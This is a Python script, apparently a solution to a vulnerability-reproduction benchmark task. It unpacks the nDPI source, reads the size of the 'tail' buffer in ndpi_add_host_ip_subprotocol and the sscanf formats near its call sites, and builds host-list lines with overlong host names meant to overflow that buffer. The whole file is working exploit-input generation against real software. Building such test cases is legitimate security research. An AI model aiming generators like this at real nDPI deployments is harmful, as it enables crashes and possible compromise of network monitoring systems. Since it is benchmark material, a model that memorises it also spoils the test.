import os
import re
import tarfile
import tempfile

class Solution:
    def _read_text(self, path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""

    def _extract_tar(self, src_path):
        tmpdir = tempfile.mkdtemp(prefix="ndpi_src_")
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory
                def safe_extract(t, path="."):
                    for member in t.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            continue
                        try:
                            t.extract(member, path)
                        except Exception:
                            pass
                safe_extract(tar, tmpdir)
        except Exception:
            pass
        return tmpdir

    def _find_files(self, root, exts=('.c', '.h', '.inc', '.cpp')):
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.endswith(exts):
                    yield os.path.join(dirpath, fn)

    def _find_function_body(self, text, func_name):
        idx = text.find(func_name + '(')
        if idx < 0:
            return None
        # Find opening brace after this
        brace_idx = text.find('{', idx)
        if brace_idx < 0:
            return None
        # Balance braces
        depth = 0
        end = brace_idx
        for i in range(brace_idx, len(text)):
            c = text[i]
            if c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    end = i + 1
                    return text[brace_idx:end]
        return None

    def _parse_tail_size(self, func_body):
        if not func_body:
            return None
        m = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]', func_body)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                return None
        return None

    def _find_sscanf_formats_near_calls(self, root, callee):
        fmts = []
        for path in self._find_files(root):
            text = self._read_text(path)
            if not text or callee not in text:
                continue
            for m in re.finditer(re.escape(callee) + r'\s*\(', text):
                pos = m.start()
                prev = text[max(0, pos - 8192):pos]
                # Capture last sscanf(<something>, "<fmt>"
                cand = None
                for sm in re.finditer(r'sscanf\s*\(\s*[^,]+,\s*"([^"]*)"', prev):
                    cand = sm.group(1)
                if cand:
                    fmts.append(cand)
        return fmts

    def _sanitize_width(self, w, default):
        try:
            wi = int(w) if w is not None else default
            if wi <= 0:
                return default
            return wi
        except Exception:
            return default

    def _gen_from_format(self, fmt, tail_size=None, max_host_len=512):
        # Generate a line matching the sscanf format
        # Attempt to produce a host field that is longer than tail_size
        # Build output by simulating the pattern
        out = []
        i = 0
        # Determine target host length
        if tail_size is None:
            target_host_len = min(max_host_len, 128)
        else:
            # try to exceed tail size safely but not explode
            target_host_len = min(max_host_len, max(tail_size + 16, (tail_size * 2)))
        used_first_char = False
        used_first_string = False
        while i < len(fmt):
            ch = fmt[i]
            if ch != '%':
                # whitespace in format consumes any whitespace; we'll put single space for them
                if ch.isspace():
                    out.append(' ')
                else:
                    out.append(ch)
                i += 1
                continue
            # Handle %%
            if i + 1 < len(fmt) and fmt[i+1] == '%':
                out.append('%')
                i += 2
                continue
            # Parse a conversion
            i += 1
            # Assignment suppression
            suppress = False
            if i < len(fmt) and fmt[i] == '*':
                suppress = True
                i += 1
            # Width
            width_str = ""
            while i < len(fmt) and fmt[i].isdigit():
                width_str += fmt[i]
                i += 1
            width = int(width_str) if width_str != "" else None
            # Size modifiers (h, l, ll, L, z, t, j)
            if i < len(fmt) and fmt[i] in ('h', 'l', 'L', 'z', 't', 'j'):
                # handle possible "ll"
                if fmt[i] == 'l' and i + 1 < len(fmt) and fmt[i+1] == 'l':
                    i += 2
                else:
                    i += 1
            if i >= len(fmt):
                break
            conv = fmt[i]
            i += 1

            # Handle scan sets %[...]
            if conv == '[':
                # Read until closing ']'
                set_start = i
                # Allow leading '^'
                negate = False
                if i < len(fmt) and fmt[i] == '^':
                    negate = True
                    i += 1
                # Collect set chars, including ranges, we won't fully interpret
                set_chars = []
                # If first char is ']' include it as part of set
                if i < len(fmt) and fmt[i] == ']':
                    set_chars.append(']')
                    i += 1
                while i < len(fmt) and fmt[i] != ']':
                    set_chars.append(fmt[i])
                    i += 1
                # skip closing bracket
                if i < len(fmt) and fmt[i] == ']':
                    i += 1
                # desired width
                w = self._sanitize_width(width, 256)
                # generate string accepted by scanset
                # If negate (e.g., %[^,]) we must avoid given chars (like comma)
                forbidden = set(set_chars) if negate else set()
                # Use 'a' and '.' as base but avoid forbidden
                s = []
                # Compute host segment; ensure at least one dot to resemble domain
                host_len = min(target_host_len, w)
                # Keep at least 4 for ".com"
                core_len = max(0, host_len - 4)
                # Build 'a' repeated avoiding forbidden
                a_char = 'a'
                dot_char = '.'
                c_char = 'c'
                o_char = 'o'
                m_char = 'm'
                # If any of these are forbidden, fall back to 'b'
                if a_char in forbidden:
                    a_char = 'b'
                if dot_char in forbidden or core_len == 0:
                    # If dot is forbidden or no space for suffix, just fill with allowed letter
                    s = [a_char] * host_len
                else:
                    # Build core and suffix ".com"
                    s = [a_char] * core_len
                    # ensure suffix length <= remaining
                    rest = host_len - core_len
                    # Build suffix string, avoiding forbidden
                    suffix = []
                    for chh in [dot_char, c_char, o_char, m_char]:
                        if len(suffix) < rest:
                            if chh in forbidden:
                                # find alternative allowed char
                                alt = 'x'
                                if alt in forbidden:
                                    alt = 'y'
                                suffix.append(alt)
                            else:
                                suffix.append(chh)
                    while len(suffix) < rest:
                        suffix.append(a_char)
                    s.extend(suffix)
                out.append(''.join(s))
                continue

            if conv in ('s',):
                # Whitespace-delimited string
                w = self._sanitize_width(width, 256)
                host_len = min(target_host_len, w)
                core_len = max(0, host_len - 4)
                s = []
                s.extend(['a'] * core_len)
                # suffix
                suffix = ".com"
                if core_len >= host_len or host_len < 4:
                    # Not enough space for suffix; fill with a's
                    s = ['a'] * host_len
                else:
                    s.append('.')
                    left = host_len - len(s)
                    tail = "com"
                    if left <= 0:
                        pass
                    elif left <= len(tail):
                        s.extend(list(tail[:left]))
                    else:
                        s.extend(list(tail))
                        # pad any remainder with 'a'
                        s.extend(['a'] * (host_len - len(s)))
                out.append(''.join(s))
                used_first_string = True
                continue

            if conv in ('d', 'i', 'u', 'x', 'o', 'p'):
                # generate numeric value
                # consider width for digits (but not necessary)
                if conv == 'x':
                    num = '1'
                elif conv == 'o':
                    num = '1'
                elif conv == 'p':
                    num = '0'
                else:
                    num = '1'
                out.append(num)
                continue

            if conv in ('c',):
                # single char; choose 'H' to route "host" path
                if not used_first_char:
                    out.append('H')
                    used_first_char = True
                else:
                    out.append('A')
                continue

            if conv in ('e', 'f', 'g', 'a'):
                out.append('1.0')
                continue

            # Unknown conv: place safe token
            out.append('X')

        # Ensure newline
        sline = ''.join(out)
        if not sline.endswith('\n'):
            sline += '\n'
        return sline

    def _generate_generic(self, tail_size=None):
        # Default fallback generator producing multiple candidate lines
        # Determine host length
        if tail_size is None:
            host_len = 128
        else:
            host_len = max(64, min(512, tail_size * 2 + 16))
        core_len = max(0, host_len - 4)
        long_host = 'a' * core_len + '.com'
        lines = []
        candidates = [
            "H,{host},1,1\n",
            "h,{host},1,1\n",
            "HOST,{host},1,1\n",
            "host,{host},1,1\n",
            "D,{host},1\n",
            "d,{host},1\n",
            "DOMAIN,{host},1\n",
            "domain,{host},1\n",
            "H;{host};1;1\n",
            "H:{host}:1:1\n",
            "H {host} 1 1\n",
            "ADD_HOST,{host},1,1\n",
            "HOST-MAP,{host},1,1\n",
            "{host},1,1\n",
            "{host}\n",
            "HOST={host},1,1\n",
            "IPHOST,{host},1,1\n",
            "host={host};proto=1;sub=1\n",
            "H,{host}\n",
        ]
        for pat in candidates:
            lines.append(pat.format(host=long_host))
        # Also add wildcard variations
        long_host2 = '*.' + long_host
        lines.append("H,{host},2,3\n".format(host=long_host2))
        lines.append("H;{host};2;3\n".format(host=long_host2))
        return ''.join(lines)

    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source if possible
        tail_size = None
        fmt_candidates = []
        try:
            root = self._extract_tar(src_path)
            # Find function body to determine tail size
            for path in self._find_files(root):
                text = self._read_text(path)
                if not text:
                    continue
                if 'ndpi_add_host_ip_subprotocol' in text:
                    func_body = self._find_function_body(text, 'ndpi_add_host_ip_subprotocol')
                    ts = self._parse_tail_size(func_body)
                    if ts is not None:
                        tail_size = ts
                    break
            # Find sscanf formats near ndpi_add_host_ip_subprotocol callsites
            fmt_candidates = self._find_sscanf_formats_near_calls(root, 'ndpi_add_host_ip_subprotocol')
        except Exception:
            pass

        # If we have a format, generate from it, else fallback generic
        lines = []
        generated_any = False
        if fmt_candidates:
            # De-duplicate preserving order
            seen = set()
            fmts = []
            for f in fmt_candidates:
                if f not in seen:
                    seen.add(f)
                    fmts.append(f)
            # Generate from up to 3 formats to keep size reasonable
            limit = min(3, len(fmts))
            for j in range(limit):
                fmt = fmts[j]
                try:
                    line = self._gen_from_format(fmt, tail_size=tail_size, max_host_len=512)
                    lines.append(line)
                    generated_any = True
                except Exception:
                    pass

        if not generated_any:
            lines.append(self._generate_generic(tail_size=tail_size))

        payload = ''.join(lines)
        # Ensure payload not excessively large
        if len(payload) > 16384:
            payload = payload[:16384]
            if not payload.endswith('\n'):
                payload += '\n'
        # Ensure non-empty
        if not payload:
            payload = self._generate_generic(tail_size=None)
        return payload.encode('utf-8', errors='ignore')
